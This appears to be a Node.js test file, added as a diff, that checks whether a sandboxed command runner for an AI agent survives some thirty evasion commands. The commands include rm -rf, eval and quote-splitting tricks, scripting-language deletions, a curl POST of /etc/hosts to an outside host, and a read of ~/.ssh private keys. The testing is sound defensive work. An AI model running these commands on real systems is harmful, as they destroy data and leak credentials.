@@ -1,0 +1,138 @@
+// P6-T1 · 적대적 검증 — **"막혔다고 말했는가"가 아니라 "미끼가 살아있는가"를 본다.**
+//
+// 어제의 실패에서 배운 것: 게이트가 `blocked === true` 만 보다가 파일이 없어서 막힌 것(ENOENT)까지
+// "보호가 작동함"으로 셌다. 메시지는 거짓말을 할 수 있지만 **파일시스템은 거짓말을 못 한다.**
+//
+// 그래서 여기서는 도구가 뭐라고 답했는지 보지 않는다. 미끼를 심고, 우회를 던지고,
+// 미끼가 그대로인지만 확인한다. 목록으로 막는 설계였다면 아래 절반은 뚫린다.
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { mkdtemp, writeFile, mkdir, readFile, readdir } from 'node:fs/promises';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { runCommand } from '../src/runtime/terminal-run.js';
+import { sandboxAvailable } from '../src/runtime/sandbox.js';
+
+const 원본 = '건드리면 안 되는 내용';
+
+async function 미끼밭() {
+  const dir = await mkdtemp(join(tmpdir(), 'gpao-t5-미끼-'));
+  await mkdir(join(dir, '하위'), { recursive: true });
+  for (const p of ['중요.md', '하위/깊은.md', '설정.json']) await writeFile(join(dir, p), 원본);
+  return dir;
+}
+
+async function 그대로인가(dir) {
+  const missing = [];
+  for (const p of ['중요.md', '하위/깊은.md', '설정.json']) {
+    try {
+      if ((await readFile(join(dir, p), 'utf8')) !== 원본) missing.push(`${p}(내용 바뀜)`);
+    } catch { missing.push(`${p}(사라짐)`); }
+  }
+  return missing;
+}
+
+// **우회 목록은 계속 늘린다.** 하나 추가할 때마다 "목록으로 막는 설계였다면 여기서 뚫렸다"가 는다.
+const 우회들 = [
+  ['정면 삭제',            (d) => `rm -f ${d}/중요.md`],
+  ['재귀 삭제',            (d) => `rm -rf ${d}`],
+  ['find 삭제',            (d) => `find ${d} -name '*.md' -delete`],
+  ['find exec 삭제',       (d) => `find ${d} -name '*.md' -exec rm {} \;`],
+  ['python 삭제',          (d) => `python3 -c "import os; os.remove('${d}/중요.md')"`],
+  ['python rmtree',        (d) => `python3 -c "import shutil; shutil.rmtree('${d}')"`],
+  ['리다이렉션 덮어쓰기',  (d) => `echo 오염 > ${d}/중요.md`],
+  ['이어쓰기',             (d) => `echo 오염 >> ${d}/중요.md`],
+  ['tee 덮어쓰기',         (d) => `echo 오염 | tee ${d}/중요.md`],
+  ['sed 제자리 수정',      (d) => `sed -i '' 's/내용/오염/' ${d}/중요.md`],
+  ['cp 로 덮어쓰기',       (d) => `cp /etc/hosts ${d}/중요.md`],
+  ['mv 로 치우기',         (d) => `mv ${d}/중요.md /tmp/가져감.md`],
+  ['truncate',             (d) => `: > ${d}/중요.md`],
+  ['dd',                   (d) => `dd if=/dev/zero of=${d}/중요.md bs=1 count=1`],
+  ['chmod',                (d) => `chmod 000 ${d}/중요.md && echo 오염 > ${d}/중요.md`],
+  ['서브셸 안에서',        (d) => `(cd ${d} && rm -f 중요.md)`],
+  ['백틱 실행',            (d) => `eval \`echo rm -f ${d}/중요.md\``],
+  ['변수 우회',            (d) => `T=${d}/중요.md; rm -f "$T"`],
+  ['따옴표 쪼개기',        (d) => `r""m -f ${d}/중요.md`],
+  ['xargs',                (d) => `echo ${d}/중요.md | xargs rm -f`],
+  ['perl',                 (d) => `perl -e 'unlink("${d}/중요.md")'`],
+  ['node',                 (d) => `node -e "require('fs').rmSync('${d}/중요.md')"`],
+  ['ruby',                 (d) => `ruby -e 'File.delete("${d}/중요.md")' 2>/dev/null || true`],
+  ['osascript',            (d) => `osascript -e 'do shell script "rm -f ${d}/중요.md"'`],
+  ['&& 뒤에 숨기기',       (d) => `echo 안녕 && rm -f ${d}/중요.md`],
+  ['; 뒤에 숨기기',        (d) => `echo 안녕; rm -f ${d}/중요.md`],
+  ['|| 뒤에 숨기기',       (d) => `false || rm -f ${d}/중요.md`],
+  ['$() 안에서',           (d) => `echo $(rm -f ${d}/중요.md)`],
+  ['백그라운드로',         (d) => `rm -f ${d}/중요.md & wait`],
+  ['스크립트 만들어 실행', (d) => `echo 'rm -f ${d}/중요.md' > /tmp/x.sh && sh /tmp/x.sh`],
+];
+
+test('미끼밭: 어떤 우회로도 파일이 사라지거나 바뀌지 않는다', { skip: !sandboxAvailable() && '이 컴퓨터는 샌드박스 없음' }, async () => {
+  const 뚫린것 = [];
+  for (const [이름, 만들기] of 우회들) {
+    const dir = await 미끼밭();
+    await runCommand(만들기(dir), { cwd: dir, timeoutMs: 15_000 });
+    const 피해 = await 그대로인가(dir);
+    if (피해.length) 뚫린것.push(`${이름} → ${피해.join(', ')}`);
+  }
+  assert.deepEqual(뚫린것, [], `우회 ${뚫린것.length}건이 뚫렸다:\n  ${뚫린것.join('\n  ')}`);
+});
+
+test('새 파일도 못 만든다(변경은 없는 것을 만드는 것도 포함이다)', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
+  const dir = await 미끼밭();
+  await runCommand(`touch ${dir}/새파일.txt && mkdir ${dir}/새폴더`, { cwd: dir });
+  const 목록 = await readdir(dir);
+  assert.ok(!목록.includes('새파일.txt'), '새 파일이 생겼다');
+  assert.ok(!목록.includes('새폴더'), '새 폴더가 생겼다');
+});
+
+test('네트워크로 내보내지 못한다(유출은 삭제보다 되돌리기 어렵다)', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
+  const r = await runCommand('curl -s -m 8 -X POST -d "@/etc/hosts" https://example.com', { timeoutMs: 15_000 });
+  assert.notEqual(r.exitCode, 0, '네트워크가 열려 있다 — 파일을 밖으로 보낼 수 있다');
+});
+
+test('비밀 자리는 읽지도 못한다(승인과 무관하게)', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
+  for (const mode of ['probe', 'granted']) {
+    const r = await runCommand('cat ~/.ssh/* 2>&1 | head -5', { mode, timeoutMs: 10_000 });
+    assert.doesNotMatch(r.stdout, /PRIVATE KEY|ssh-rsa|ssh-ed25519/,
+      `${mode}: 개인키가 읽혔다 — 승인해도 비밀은 안 새야 한다`);
+  }
+});
+
+test('토큰이 든 환경변수는 자식에게 안 넘어간다', async () => {
+  const r = await runCommand('echo "[$PLAIN_VAR][$MY_API_KEY]"', {
+    env: { ...process.env, PLAIN_VAR: '안전값', MY_API_KEY: 'sk-절대노출금지' },
+  });
+  assert.match(r.stdout, /\[안전값\]/, '평범한 변수까지 막으면 명령이 안 돈다');
+  assert.doesNotMatch(r.stdout, /sk-절대노출금지/, 'API 키가 자식 프로세스로 새어 나갔다');
+});
+
+// ── 막기만 하면 도구가 아니다 ────────────────────────────────────────────
+test('읽기·확인 명령은 그대로 통과한다', { skip: !sandboxAvailable() && '샌드박스 없음' }, async () => {
+  const dir = await 미끼밭();
+  for (const cmd of [
+    'pwd', 'ls -la', 'cat 중요.md', 'find . -name "*.md" | wc -l',
+    'grep -r 내용 . | head -3', 'du -sh .', 'echo $((1+1))',
+  ]) {
+    const r = await runCommand(cmd, { cwd: dir, timeoutMs: 15_000 });
+    assert.equal(r.exitCode, 0, `읽기 명령이 막혔다: ${cmd}\n${r.stderr}`);
+  }
+});
+
+test('안 끝나는 명령은 시간에 걸려 끝나고, 그 사실을 남긴다', async () => {
+  const r = await runCommand('sleep 30', { timeoutMs: 1500 });
+  assert.equal(r.stopped, 'timeout', '왜 끝났는지 안 남기면 "실패했다"와 구분이 안 된다');
+  assert.ok(r.durationMs < 8000, `제때 안 끊겼다(${r.durationMs}ms)`);
+});
+
+test('입력을 기다리는 명령에 갇히지 않는다', async () => {
+  const r = await runCommand('read -r 답', { timeoutMs: 4000 });
+  assert.notEqual(r.stopped, 'timeout', 'stdin 이 열려 있어 프롬프트에서 멈췄다');
+});
+
+test('출력이 길면 가운데를 접고 접었다고 말한다', async () => {
+  const r = await runCommand('seq 1 200000');
+  assert.equal(r.truncated, true);
+  assert.match(r.stdout, /가운데 \d+자 생략/, '조용히 자르면 모델이 "이게 전부"로 읽는다');
+  assert.match(r.stdout, /^1\n/, '앞을 남겨야 무슨 일이 시작됐는지 안다');
+  assert.match(r.stdout, /200000\n?$/, '뒤를 남겨야 어떻게 끝났는지 안다');
+});
